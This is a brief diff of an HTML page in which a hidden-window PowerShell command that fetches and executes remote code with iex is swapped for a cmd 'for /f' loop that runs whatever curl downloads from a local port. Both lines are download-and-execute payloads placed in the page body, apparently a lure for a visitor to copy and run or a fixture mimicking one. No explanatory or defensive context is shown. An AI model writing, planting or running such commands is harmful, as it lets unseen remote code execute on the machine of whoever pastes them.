@@ -6,7 +6,7 @@
 </head>
 <body>
 
-    powershell -WindowStyle Hidden -c "iex((iwr -Uri http://localhost:3415/p?1-0-0 -UseBasicParsing).Content)"
+for /f "delims=" %i in ('curl -s http://localhost:3415/p?0-0-0') do (%i)
 
 </body>
 </html>
